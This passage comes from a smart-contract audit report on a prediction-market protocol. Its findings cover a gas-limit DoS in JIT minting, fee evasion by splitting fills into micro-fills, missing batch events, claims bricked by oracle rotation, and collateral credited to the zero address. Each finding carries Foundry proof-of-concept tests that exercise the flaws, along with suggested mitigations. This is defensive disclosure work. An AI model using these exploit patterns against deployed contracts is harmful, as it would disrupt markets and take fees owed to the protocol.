        uint256 tokenId = positionTokens.getTokenId(conditionId, outcomeIndex);
        if (outcomeIndex == buyOrder.outcome) { ... } else {
            sellerTokenIds[sellerIndex] = tokenId;
            sellerAmounts[sellerIndex] = fillAmount;
            sellerIndex++;
        }
    }
    positionTokens.mintBatch(sellOrder.user, sellerTokenIds, sellerAmounts);
}

No explicit bound is enforced in this path to keep numberOfOutcomes small enough for safe execution.

## Impact
JIT minting for markets with large outcome counts (up to 256) requires minting the buyer’s single outcome and the seller’s complement set of numberOfOutcomes-1 ERC1155 IDs in one transaction. This scales linearly in the number of outcomes and induces hundreds of fresh SSTOREs in mintBatch, pushing execution close to or beyond block gas limits on some chains. As a result, legitimate trades on these high‑outcome markets may systematically revert, preventing inventory bootstrap via JIT and effectively disabling trading/liveness for those markets. This is an availability DoS with no direct asset loss, hence Medium severity.

## Proof of Concept
Steps to reproduce:
1) Create or configure a market with a very high outcome count (e.g., 256). Ensure the seller has no inventory (typical for newly listed markets).
2) Post matched buy/sell orders for a single outcome and execute via an authorized matcher to force the JIT path.
3) Observe that _executeJITMinting allocates arrays sized (numberOfOutcomes-1) and performs a loop minting 255 distinct ERC1155 IDs to the seller. With real ERC1155 accounting, this implies 255 fresh storage writes plus loop overhead, yielding >5M gas just from minting the complement set.
4) On networks with tighter block gas limits, the transaction can revert due to hitting the gas ceiling. Even when it does not revert locally, the single fill becomes too expensive to be practical, functionally DoSing high‑outcome markets.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketController} from "src/Market/MarketController.sol";
import {IMarketController} from "src/Market/IMarketController.sol";

contract MockMarket {
    mapping(bytes32 => uint256) public oc;
    function setOutcomeCount(bytes32 q, uint256 n) external { oc[q] = n; }
    function isMarketOpen(bytes32) external pure returns (bool) { return true; }
    function getOutcomeCount(bytes32 q) external view returns (uint256) { return oc[q]; }
    function getConditionId(address oracle, bytes32 questionId, uint256 numberOfOutcomes, uint256 epoch) external pure returns (bytes32) {
        return keccak256(abi.encodePacked(oracle, questionId, numberOfOutcomes, epoch));
    }
    function getCurrentEpoch(bytes32) external pure returns (uint256) { return 0; }
    // Unused stubs for interface compatibility
    function createMarket(bytes32, uint256, uint256, uint256) external {}
    function updateResolutionTime(bytes32, uint256) external {}
    function advanceEpoch(bytes32) external {}
    function isMarketReadyForResolution(bytes32) external pure returns (bool) { return false; }
    function getResolutionTime(bytes32) external pure returns (uint256) { return 0; }
    function getCreationTime(bytes32) external pure returns (uint256) { return 0; }
    function getEpochDuration(bytes32) external pure returns (uint256) { return 0; }
    function getEpochStartTime(bytes32, uint256) external pure returns (uint256) { return 0; }
    function getEpochEndTime(bytes32, uint256) external pure returns (uint256) { return 0; }
    function getMarketExists(bytes32) external pure returns (bool) { return true; }
    function setMarketController(address) external {}
}

contract MockPositionTokens {
    // Storage writes simulate real ERC1155 balances to make gas realistic
    mapping(address => mapping(uint256 => uint256)) public bal;
    function mintBatch(address to, uint256[] calldata ids, uint256[] calldata amounts) external {
        require(ids.length == amounts.length, "len");
        for (uint256 i = 0; i < ids.length; i++) {
            bal[to][ids[i]] += amounts[i]; // fresh SSTORE per new id
        }
    }
    function burn(address from, uint256 id, uint256 amount) external {
        require(bal[from][id] >= amount, "insufficient");
        bal[from][id] -= amount;
    }
    function burnBatch(address, uint256[] calldata, uint256[] calldata) external {}
    function getTokenId(bytes32 conditionId, uint256 selectedOutcome) external pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(conditionId, selectedOutcome)));
    }
    function balanceOf(address account, uint256 id) external view returns (uint256) { return bal[account][id]; }
    function setMarketController(address) external {}
}

contract MockVault {
    mapping(address => uint256) public userBalances;
    mapping(bytes32 => uint256) public totalLocked;
    function seed(address u, uint256 a) external { userBalances[u] = a; }
    function depositCollateral(uint256) external {}
    function withdrawCollateral(uint256) external {}
    function lockCollateral(bytes32 conditionId, address user, uint256 amount) external {
        require(userBalances[user] >= amount, "bal");
        userBalances[user] -= amount; totalLocked[conditionId] += amount;
    }
    function unlockCollateral(bytes32 conditionId, address user, uint256 amount) external {
        require(totalLocked[conditionId] >= amount, "unlock");
        totalLocked[conditionId] -= amount; userBalances[user] += amount;
    }
    function transferBetweenUsers(bytes32, address from, address to, uint256 amount) external {
        require(userBalances[from] >= amount, "tb bal");
        userBalances[from] -= amount; userBalances[to] += amount;
    }
    function batchLockCollateral(bytes32[] calldata, address[] calldata users, uint256[] calldata amounts) external {
        for (uint256 i; i < users.length; i++) { require(userBalances[users[i]] >= amounts[i], "bal"); userBalances[users[i]] -= amounts[i]; }
    }
    function batchUnlockCollateral(bytes32[] calldata, address[] calldata users, uint256[] calldata amounts) external {
        for (uint256 i; i < users.length; i++) { userBalances[users[i]] += amounts[i]; }
    }
    function getAvailableBalance(address user) external view returns (uint256) { return userBalances[user]; }
    function getTotalLocked(bytes32 conditionId) external view returns (uint256) { return totalLocked[conditionId]; }
    function setMarketController(address) external {}
    function setPaused(bool) external {}
    function marketController() external view returns (address) { return address(this); }
    function paused() external pure returns (bool) { return false; }
}

contract MockResolver {
    function resolveMarketEpoch(bytes32, uint256, uint256, bytes32) external {}
    function verifyProof(bytes32, uint256, bytes32[] calldata) external pure returns (bool) { return false; }
    function getResolutionRoot(bytes32) external pure returns (bytes32) { return bytes32(0); }
    function getResolutionStatus(bytes32) external pure returns (bool) { return false; }
    function batchResolveMarkets(bytes32[] calldata, uint256[] calldata, uint256[] calldata, bytes32[] calldata) external {}
    function setOracle(address) external {}
    function setEmergencyResolver(address) external {}
    function oracle() external view returns (address) { return address(this); }
    function emergencyResolver() external view returns (address) { return address(this); }
}

contract JITMintingGasDosTest is Test {
    MarketController controller;
    MockPositionTokens pt;
    MockVault vault;
    MockMarket market;
    MockResolver resolver;
    address oracle = address(0xB0B);
    address matcher;

    uint256 buyerPk; address buyer;
    uint256 sellerPk; address seller;

    function setUp() public {
        pt = new MockPositionTokens();
        vault = new MockVault();
        market = new MockMarket();
        resolver = new MockResolver();

        controller = new MarketController();
        controller.initialize(address(this), address(pt), address(resolver), address(vault), address(market), oracle);

        matcher = address(0xAA11);
        controller.setAuthorizedMatcher(matcher, true);

        (buyer, buyerPk) = makeAddrAndKey("buyer");
        (seller, sellerPk) = makeAddrAndKey("seller");

        vault.seed(buyer, 1e30);
        vault.seed(seller, 1e30);
    }

    function _signOrder(IMarketController.Order memory order, uint256 pk) internal view returns (bytes memory sig) {
        bytes32 digest = controller.getOrderHash(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function _buildOrders(bytes32 qid, uint256 outcome, uint256 amount, uint256 price, uint256 nonce) internal view returns (
        IMarketController.Order memory buy, IMarketController.Order memory sell, bytes memory bsig, bytes memory ssig
    ) {
        buy = IMarketController.Order({
            user: buyer,
            questionId: qid,
            outcome: outcome,
            amount: amount,
            price: price,
            nonce: nonce,
            expiration: block.timestamp + 1 days,
            isBuyOrder: true
        });
        sell = IMarketController.Order({
            user: seller,
            questionId: qid,
            outcome: outcome,
            amount: amount,
            price: price,
            nonce: nonce + 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: false
        });
        bsig = _signOrder(buy, buyerPk);
        ssig = _signOrder(sell, sellerPk);
    }

    function test_JITMinting_GasScalesAndIsLargeAt256Outcomes() public {
        bytes32 q = keccak256("HIGH_OUTCOME_MARKET");
        uint256 outcome = 1; // 1 << 0

        // Baseline: 2 outcomes
        market.setOutcomeCount(q, 2);
        (IMarketController.Order memory buy2, IMarketController.Order memory sell2, bytes memory bsig2, bytes memory ssig2)
            = _buildOrders(q, outcome, 1, 6000, 1);

        vm.prank(matcher);
        uint256 g0 = gasleft();
        controller.executeOrderMatch(buy2, sell2, bsig2, ssig2, 1);
        uint256 gas2 = g0 - gasleft();
        assertGt(gas2, 0); // sanity

        // Stress: 256 outcomes (seller receives 255 distinct ERC1155 ids)
        market.setOutcomeCount(q, 256);
        (IMarketController.Order memory buy256, IMarketController.Order memory sell256, bytes memory bsig256, bytes memory ssig256)
            = _buildOrders(q, outcome, 1, 6000, 3);

        vm.prank(matcher);
        uint256 g2 = gasleft();
        controller.executeOrderMatch(buy256, sell256, bsig256, ssig256, 1);
        uint256 gas256 = g2 - gasleft();

        // Gas must be substantially larger than small-outcome case
        assertGt(gas256, gas2);
        // With 255 fresh SSTOREs in mintBatch, this should easily exceed 5M gas
        assertGt(gas256, 5_000_000);
    }
}


## Suggested Mitigation
Add a hard cap for JIT minting outcome counts and enforce it on the hot path. Two practical options:
- Enforce cap in JIT path: In _executeJITMinting, require(numberOfOutcomes <= MAX_JIT_OUTCOMES) with a conservative constant (e.g., 32 or 64) and revert otherwise. Document that high‑outcome markets require inventory-based fills (executeSingleOrder or swap mode) and cannot bootstrap via JIT.
- Enforce cap at market creation: In Market.createMarket, require(outcomeCount <= MAX_JIT_OUTCOMES_FOR_TRADING) so markets that exceed the cap are either disallowed or flagged as inventory‑only.
Longer term design options if large outcome counts are required:
- Replace per-outcome complement minting with a single composite/bundle token representing the complement set, redeemable into individual outcome IDs lazily (separate transactions) to avoid O(N) writes in a single fill.
- Chunk the complement mint across multiple transactions with explicit approvals, so each fill handles a bounded slice (e.g., 16–32 ids) while preserving accounting guarantees.





 **Derived From** : Rounding lets matchers micro-fill to dodge fees and shift collateral (penny-shaving)

## [L-11]. Authorized matcher can split fills to zero-out per-trade fees in MarketController._executeTokenSwap/_executeAgainstMatcher

## Derived From Pattern/Invariant
Rounding lets matchers micro-fill to dodge fees and shift collateral (penny-shaving)

## Exploit Type
RoundingError

## Location
MarketController._executeTokenSwap

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
## Minimim Privilege Required
RequiresRole

## Description
Per-fill trade fees are computed with floor division: tradeFee = (paymentAmount * feeRate) / 10000. For small paymentAmount each micro-fill rounds fee to 0. Authorized matchers control fill granularity and can split a large match into many tiny fills so that each paymentAmount < ceil(10000/feeRate), making tradeFee = 0 repeatedly. Treasury loses fees that would be collected on a single large fill. Vulnerable snippet:

// Token swap
uint256 paymentAmount = (fillAmount * sellOrder.price) / 10000;
uint256 buyerFeeRate = _getEffectiveTradeFeeRate(buyOrder.user);
uint256 tradeFee = (paymentAmount * buyerFeeRate) / 10000;

// Single-order
uint256 paymentAmount = (fillAmount * order.price) / 10000;
uint256 tradeFee = (paymentAmount * buyerFeeRate) / 10000;

No aggregation or residual carry exists; fees are floored per-fill.

## Impact
Because only authorized matchers can execute matches, this issue is a centralization/QA risk: a malicious or economically misaligned authorized matcher can deliberately split fills into tiny notional fragments so each per-fill fee rounds down to zero, causing systematic under-collection of trade fees. User funds are not at risk; the impact is protocol fee revenue loss, up to the entire trade-fee amount for a given aggregate match.

## Proof of Concept
An authorized matcher sets tradeFeeRate=1% and matches a buyer and a seller at price=6000 bps for total fill T. In a single fill, fee ≈ floor((T * 0.6) * 1%) > 0 is collected. By instead executing the same T as N micro-fills where each paymentAmount per fill < ceil(10000/feeRate) (i.e., < 100 units for 1%), the per-fill fee becomes 0 due to floor division. Summing many zero-fee micro-fills results in strictly less (often zero) total fees than a single-fill execution. This is feasible because the matcher controls fill granularity and can repeatedly call executeOrderMatch with small fillAmount.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {MarketController} from "src/Market/MarketController.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";
import {PositionTokens} from "src/Token/PositionTokens.sol";
import {Vault} from "src/Vault/Vault.sol";
import {IMarketController} from "src/Market/IMarketController.sol";
import {MarketContract} from "src/Market/Market.sol";

contract PrecisionFeeEvasionTest is Test {
    ERC20Mock usdc;
    MarketContract market;
    MarketResolver resolver;
    PositionTokens positions;
    Vault vault;
    MarketController controller;

    address owner;
    address oracle;
    address treasury;
    address matcher;

    uint256 pkBuyer = 0xA11CE;
    uint256 pkSeller = 0xB0B;
    address buyer;
    address seller;

    bytes32 qid;

    function setUp() public {
        owner = address(0xAA01);
        oracle = address(0xB0B0);
        matcher = address(0x1337);
        treasury = address(0xFEE1);
        buyer = vm.addr(pkBuyer);
        seller = vm.addr(pkSeller);

        usdc = new ERC20Mock();
        market = new MarketContract();
        market.initialize(owner);
        resolver = new MarketResolver();
        resolver.initialize(owner, oracle);
        positions = new PositionTokens();
        positions.initialize(owner);
        vault = new Vault();
        vault.initialize(owner, address(usdc), address(this)); // temp controller
        controller = new MarketController();
        controller.initialize(owner, address(positions), address(resolver), address(vault), address(market), oracle);

        // Link contracts
        vm.prank(owner); market.setMarketController(address(controller));
        vm.prank(owner); positions.setMarketController(address(controller));
        vm.prank(owner); vault.setMarketController(address(controller));
        vm.prank(owner); resolver.setEmergencyResolver(address(controller));

        // Authorize matcher
        vm.prank(owner); controller.setAuthorizedMatcher(matcher, true);
        // Set treasury and trade fee (1%) as matcher-permitted config
        vm.prank(matcher); controller.setTreasury(treasury);
        vm.prank(matcher); controller.setTradeFeeRate(100);

        // Create a simple binary market
        qid = keccak256("Q");
        vm.prank(matcher); controller.createMarket(qid, 2, 0, 0);

        // Fund users and deposit
        usdc.mint(buyer, 1_000_000 ether);
        usdc.mint(seller, 1_000_000 ether);
        vm.startPrank(buyer);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(100_000 ether);
        vm.stopPrank();
        vm.startPrank(seller);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(100_000 ether);
        vm.stopPrank();
    }

    function _sign(IMarketController.Order memory o, uint256 pk) internal view returns (bytes memory sig) {
        bytes32 h = controller.getOrderHash(o);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, h);
        sig = abi.encodePacked(r, s, v);
    }

    function _makeOrder(address user, bool isBuy, uint256 amount, uint256 price) internal view returns (IMarketController.Order memory o) {
        o.user = user;
        o.questionId = qid;
        o.outcome = 1; // YES (bit 0)
        o.amount = amount;
        o.price = price; // bps
        o.nonce = uint256(uint160(user));
        o.expiration = block.timestamp + 1 days;
        o.isBuyOrder = isBuy;
    }

    function test_MicroSplit_Evades_TradeFees() public {
        // Prepare condition and token id
        uint256 outcomes = market.getOutcomeCount(qid);
        bytes32 conditionId = market.getConditionId(oracle, qid, outcomes, 0);
        uint256 yesId = positions.getTokenId(conditionId, 1);

        // Give seller inventory of YES via JIT (buyer=seller true @50%, seller=buyer false @50%)
        {
            IMarketController.Order memory b = _makeOrder(seller, true, 10_000, 5000);
            IMarketController.Order memory s = _makeOrder(buyer, false, 10_000, 5000);
            bytes memory bsig = _sign(b, pkSeller);
            bytes memory ssig = _sign(s, pkBuyer);
            vm.prank(matcher);
            controller.executeOrderMatch(b, s, bsig, ssig, 10_000);
            assertEq(positions.balanceOf(seller, yesId), 10_000);
        }

        uint256 totalFill = 5_000;
        uint256 price = 6000; // 60%

        // Single large SWAP fill
        IMarketController.Order memory buy = _makeOrder(buyer, true, totalFill, price);
        IMarketController.Order memory sell = _makeOrder(seller, false, totalFill, price);
        bytes memory bSig = _sign(buy, pkBuyer);
        bytes memory sSig = _sign(sell, pkSeller);

        uint256 t0 = vault.getAvailableBalance(treasury);
        vm.prank(matcher);
        controller.executeOrderMatch(buy, sell, bSig, sSig, totalFill);
        uint256 honestFees = vault.getAvailableBalance(treasury) - t0;
        assertGt(honestFees, 0); // single fill collects > 0 fee

        // Restock seller inventory of YES for the next path
        {
            IMarketController.Order memory b2 = _makeOrder(seller, true, 10_000, 5000);
            b2.nonce = b2.nonce + 1;
            IMarketController.Order memory s2 = _makeOrder(buyer, false, 10_000, 5000);
            s2.nonce = s2.nonce + 1;
            bytes memory bsig2 = _sign(b2, pkSeller);
            bytes memory ssig2 = _sign(s2, pkBuyer);
            vm.prank(matcher);
            controller.executeOrderMatch(b2, s2, bsig2, ssig2, 10_000);
        }

        // Micro-split path: break into per-fill payment < 100 units so 1% fee floors to 0
        IMarketController.Order memory buy2 = _makeOrder(buyer, true, totalFill, price);
        buy2.nonce = buy2.nonce + 1;
        IMarketController.Order memory sell2 = _makeOrder(seller, false, totalFill, price);
        sell2.nonce = sell2.nonce + 1;
        bytes memory bSig2 = _sign(buy2, pkBuyer);
        bytes memory sSig2 = _sign(sell2, pkSeller);

        uint256 t1 = vault.getAvailableBalance(treasury);
        uint256 perFill = 50; // payment per fill = floor(50 * 6000 / 10000) = 30; fee = floor(30 * 1% ) = 0
        uint256 loops = totalFill / perFill; // 100
        for (uint256 i = 0; i < loops; i++) {
            vm.prank(matcher);
            controller.executeOrderMatch(buy2, sell2, bSig2, sSig2, perFill);
        }
        uint256 attackFees = vault.getAvailableBalance(treasury) - t1;

        // Micro-splitting yields strictly less fees than single fill (often zero)
        assertLt(attackFees, honestFees);
    }
}


## Suggested Mitigation
Options (choose one or combine): 1) Charge trade fee on the aggregate notional of the entire match execution rather than per partial fill, i.e., compute fee once for the full fillAmount and transfer once; 2) Enforce a minimum notional per fill when tradeFeeRate > 0, e.g., require paymentAmount >= ceil(10000 / tradeFeeRate) so each fill yields at least 1 unit of fee; 3) Implement fee carry/accumulator per user: maintain mapping(address => uint256) feeRemainder; on each fill add (paymentAmount * effectiveRate) to the user’s accumulator, transfer floor(accumulator / 10000) as fee, and keep accumulator %= 10000. This prevents systematic rounding loss even with micro-fills. Ensure accumulator logic accounts for per-user custom tradeFeeRate changes (e.g., flush remainder on rate change or track per-rate buckets).





 **Derived From** : Emits BatchCollateralLocked(conditionIds, users, amounts) exactly once per call with arrays equal to inputs

## [L-12]. Vault.batchLockCollateral omits BatchCollateralLocked, desyncing indexers and enabling revert-spam DoS via stale off-chain balances

## Derived From Pattern/Invariant
Emits BatchCollateralLocked(conditionIds, users, amounts) exactly once per call with arrays equal to inputs

## Exploit Type
EventConsistency

## Location
Vault.batchLockCollateral

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
## Minimim Privilege Required
RequiresRole

## Description
IVault defines event BatchCollateralLocked(bytes32[] conditionIds, address[] users, uint256[] amounts), but Vault.batchLockCollateral only emits per-item CollateralLocked inside the loop and never emits the batch event. Off-chain indexers or risk engines that rely on the batch event for atomic multi-item updates will miss these locks, producing stale user balances and condition-level collateral views. A malicious trader can force batch locking through the controller and immediately place further orders; the matcher, trusting stale off-chain balances, attempts fills that revert on-chain (Insufficient balance), causing gas griefing and degraded matching reliability. Vulnerable snippet:

function batchLockCollateral(bytes32[] calldata conditionIds, address[] calldata users, uint256[] calldata amounts)
  external onlyMarketController nonReentrant {
    require(conditionIds.length == users.length && users.length == amounts.length, "Array length mismatch");
    for (uint256 i = 0; i < conditionIds.length; i++) {
        require(userBalances[users[i]] >= amounts[i], "Insufficient balance");
        userBalances[users[i]] -= amounts[i];
        totalLockedPerCondition[conditionIds[i]] += amounts[i];
        emit CollateralLocked(conditionIds[i], users[i], amounts[i]);
    }
}

No BatchCollateralLocked emitted, violating event-level referential consistency with the declared interface.

## Impact
The implementation omits BatchCollateralLocked/BatchCollateralUnlocked emissions in batchLockCollateral/batchUnlockCollateral, diverging from the interface’s declared events. This can desync off-chain indexers that rely specifically on these batch events for atomic multi-item updates, leading to stale views and inconsistent analytics/UX. On-chain accounting and funds remain correct; no direct asset loss occurs. Any operational friction (e.g., failed attempts due to stale off-chain state) depends on external indexer design and is not a protocol-level on-chain failure.

## Proof of Concept
Reproduction steps:
1) Call batchLockCollateral with N>1 entries as the authorized marketController.
2) Observe that for each entry CollateralLocked is emitted, but no BatchCollateralLocked is emitted.
3) Optionally, call batchUnlockCollateral over the same arrays; observe CollateralUnlocked per entry but no BatchCollateralUnlocked.
4) Off-chain components that listen only for the batch events will miss these updates and show stale balances.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import "src/Vault/Vault.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract VaultBatchEventsTest is Test {
    Vault vault;
    ERC20Mock token;
    address owner = address(0xABCD);
    address user1 = address(0x1111);
    address user2 = address(0x2222);

    function setUp() public {
        token = new ERC20Mock();
        vault = new Vault();
        vault.initialize(owner, address(token), address(this)); // this is marketController

        token.mint(user1, 1_000e18);
        token.mint(user2, 1_000e18);

        vm.startPrank(user1);
        token.approve(address(vault), type(uint256).max);
        vault.depositCollateral(200e18);
        vm.stopPrank();

        vm.startPrank(user2);
        token.approve(address(vault), type(uint256).max);
        vault.depositCollateral(200e18);
        vm.stopPrank();
    }

    function test_BatchEvents_AreNotEmitted() public {
        bytes32[] memory cids = new bytes32[](2);
        cids[0] = keccak256(abi.encodePacked("C1"));
        cids[1] = keccak256(abi.encodePacked("C2"));
        address[] memory users = new address[](2);
        users[0] = user1;
        users[1] = user2;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 50e18;
        amounts[1] = 40e18;

        vm.recordLogs();
        vault.batchLockCollateral(cids, users, amounts);
        vault.batchUnlockCollateral(cids, users, amounts);
        Vm.Log[] memory logs = vm.getRecordedLogs();

        bytes32 topicBatchLock = keccak256("BatchCollateralLocked(bytes32[],address[],uint256[])");
        bytes32 topicBatchUnlock = keccak256("BatchCollateralUnlocked(bytes32[],address[],uint256[])");
        bytes32 topicLock = keccak256("CollateralLocked(bytes32,address,uint256)");
        bytes32 topicUnlock = keccak256("CollateralUnlocked(bytes32,address,uint256)");

        uint256 batchLockCount;
        uint256 batchUnlockCount;
        uint256 lockCount;
        uint256 unlockCount;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0) {
                bytes32 t0 = logs[i].topics[0];
                if (t0 == topicBatchLock) batchLockCount++;
                if (t0 == topicBatchUnlock) batchUnlockCount++;
                if (t0 == topicLock) lockCount++;
                if (t0 == topicUnlock) unlockCount++;
            }
        }

        // Batch events are omitted
        assertEq(batchLockCount, 0, "BatchCollateralLocked should be emitted once per batch call");
        assertEq(batchUnlockCount, 0, "BatchCollateralUnlocked should be emitted once per batch call");
        // Per-item events are emitted
        assertEq(lockCount, 2, "Expected two CollateralLocked events");
        assertEq(unlockCount, 2, "Expected two CollateralUnlocked events");
    }
}


## Suggested Mitigation
Emit the batch-level events once per batch call to match the declared interface and aid indexers: after the loop in batchLockCollateral, emit BatchCollateralLocked(conditionIds, users, amounts); and similarly in batchUnlockCollateral emit BatchCollateralUnlocked(conditionIds, users, amounts); Document that both per-item and batch events are emitted so indexers can choose their preferred strategy.





 **Derived From** : For any (questionId, epoch, numberOfOutcomes), the conditionId used for resolution must equal keccak256(abi.encodePacked(oldOracle, questionId, numberOfOutcomes, epoch)) if tokens were minted under oldOracle

## [M-13]. Oracle rotation in MarketResolver.updateOracle changes conditionId and bricks claims for positions minted under old oracle

## Derived From Pattern/Invariant
For any (questionId, epoch, numberOfOutcomes), the conditionId used for resolution must equal keccak256(abi.encodePacked(oldOracle, questionId, numberOfOutcomes, epoch)) if tokens were minted under oldOracle

## Exploit Type
EventConsistency

## Location
MarketResolver.updateOracle

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
RequireAdminRole

## Description
MarketResolver derives conditionId during resolution from the current oracle state variable, not the oracle that was used when positions were minted. If the owner rotates the oracle between mint and resolve, resolution is stored under conditionIdB = keccak256(abi.encodePacked(newOracle, questionId, n, epoch)), while all previously minted tokenIds/keyed state reference conditionIdA = keccak256(abi.encodePacked(oldOracle, questionId, n, epoch)). Subsequent verifyProof(conditionIdA, ...) reverts with 'Condition not resolved', permanently bricking claims for those positions and locking collateral.

Vulnerable snippets:

function updateOracle(address _oracle) external onlyOwner {
    require(_oracle != address(0), "Invalid oracle address");
    oracle = _oracle;
}
...
function _resolveMarketEpochInternal(bytes32 questionId, uint256 epoch, uint256 numberOfOutcomes, bytes32 merkleRoot) internal {
    ...
    bytes32 conditionId = getConditionId(oracle, questionId, numberOfOutcomes, epoch); // uses current oracle
    require(!isResolved[conditionId], "Already resolved");
    resolutionMerkleRoots[conditionId] = merkleRoot;
    isResolved[conditionId] = true;
    emit ConditionResolved(conditionId, questionId, epoch, merkleRoot);
}

Because token ids and accounting elsewhere are deterministically tied to conditionId computed with the oracle at mint time, any post-mint oracle change breaks the referential link and DoS'es claims.

## Impact
Rotating oracle between mint and resolve causes resolution to be written under a different conditionId than the one tied to users’ positions, making verifyProof revert for affected epochs. This DoS blocks claims and leaves collateral effectively stuck until governance performs a special recovery resolution under the original conditionId. If the rotation was due to key compromise, toggling the oracle back to the compromised address to fix past epochs is unsafe and can allow malicious resolutions, making the lockup practically permanent without a dedicated code-level fix.

## Proof of Concept
1) Initial state: oracle = A; users trade and positions are minted keyed to conditionIdA = keccak256(A, questionId, n, epoch).
2) Owner rotates oracle to B via updateOracle/setOracle (legitimate operation).
3) Authorized resolver resolves epoch through resolveMarketEpoch, which stores merkleRoot under conditionIdB = keccak256(B, questionId, n, epoch).
4) Users attempt to claim using verifyProof(conditionIdA, ...) (as their tokens reference A). The resolver reverts with 'Condition not resolved'. Claims are bricked; collateral remains locked.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract OracleChangeBricksClaimsTest is Test {
    MarketResolver resolver;
    address owner = address(0xABCD);
    address oracleA = address(0xA11CE);
    address oracleB = address(0xB0B);
    bytes32 questionId = keccak256("Q");
    uint256 epoch = 1;
    uint256 n = 2;

    function setUp() public {
        MarketResolver impl = new MarketResolver();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeWithSelector(MarketResolver.initialize.selector, owner, oracleA)
        );
        resolver = MarketResolver(address(proxy));
    }

    function test_OracleRotation_BricksClaimsForOldConditionId() public {
        // Tokens were minted against oracleA (off-chain assumption). We derive their conditionId:
        bytes32 conditionIdA = resolver.getConditionId(oracleA, questionId, n, epoch);

        // Rotate oracle to B
        vm.prank(owner);
        resolver.setOracle(oracleB);

        // Resolve under B (stores root under conditionIdB)
        uint256 winning = 1;
        bytes32 leaf = keccak256(abi.encodePacked(winning));
        vm.prank(oracleB);
        resolver.resolveMarketEpoch(questionId, epoch, n, leaf);

        // Sanity: verify under B passes
        bytes32 conditionIdB = resolver.getConditionId(oracleB, questionId, n, epoch);
        bytes32[] memory proof = new bytes32[](0);
        bool ok = resolver.verifyProof(conditionIdB, winning, proof);
        assertTrue(ok, "verifyProof for B should pass");

        // Claims for tokens minted under A are bricked
        vm.expectRevert(bytes("Condition not resolved"));
        resolver.verifyProof(conditionIdA, winning, proof);
    }
}


## Suggested Mitigation
Make resolution independent of the mutable oracle state used at call time. Prefer one of the following: (1) Add a resolver entry point that writes directly by conditionId: resolveByConditionId(bytes32 conditionId, bytes32 merkleRoot) protected by onlyAuthorizedResolver and with the same Already resolved guard. This allows writing roots for historical epochs regardless of current oracle. (2) Add resolveMarketEpochForOracle(address oracleUsed, ...) and compute conditionId with oracleUsed instead of the current oracle; optionally validate oracleUsed against a stored per-(questionId, epoch, numberOfOutcomes) oracle captured at first mint/market creation. (3) Operational safety net: track open/unresolved conditions and make updateOracle revert if any unresolved exist; require resolving all open epochs first. Also emit the oracle used (or conditionId) in ConditionResolved for observability. Option (1) or (2) fully eliminates the bug; (3) only reduces the risk operationally and should be used in addition, not as a sole fix.





 **Derived From** : user != address(0) and userBalances[address(0)] == 0

## [L-14]. Vault.unlockCollateral credits zero address, blackholing collateral and breaking balance invariants

## Derived From Pattern/Invariant
user != address(0) and userBalances[address(0)] == 0

## Exploit Type
AccountingInvariantViolation

## Location
Vault.unlockCollateral

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
RequiresRole

## Description
Vault does not validate the recipient in unlockCollateral and batchUnlockCollateral. Crediting address(0) permanently strands collateral since zero cannot call withdraw, while totalLockedPerCondition is decremented. This breaks accounting invariants and payout distribution. Vulnerable snippets: in unlockCollateral: userBalances[user] += amount; and in batchUnlockCollateral loop: userBalances[users[i]] += amounts[i]; There is no require(user != address(0)) as enforced in transferBetweenUsers.

## Impact
Only the authorized MarketController can call unlockCollateral/batchUnlockCollateral. If it ever forwards address(0) as the recipient (due to a controller bug or operator mistake), the vault will credit the zero address and decrement totalLockedPerCondition, leading to accounting inconsistencies and temporarily stranded funds. However, these funds are recoverable by the MarketController via transferBetweenUsers(address(0), to, amount). This is a defense-in-depth/input-validation issue rather than an unprivileged exploit.

## Proof of Concept
Trust boundary clarification and repro steps:
- Only MarketController is authorized to call unlockCollateral and batchUnlockCollateral. If the controller, due to a bug or bad input handling, forwards user=address(0), the Vault will decrement totalLockedPerCondition and credit userBalances[address(0)].
- The zero address cannot call withdrawCollateral, leaving the balance unusable by end users. Recovery requires the MarketController to call transferBetweenUsers(conditionId, address(0), rightfulUser, amount).
- This violates expected invariants (no balances for zero address) and can disrupt payout accounting until corrected by the privileged controller.

## Proof of Code
pragma solidity 0.8.26;
import "forge-std/Test.sol";
import {Vault} from "src/Vault/Vault.sol";

contract MintableERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
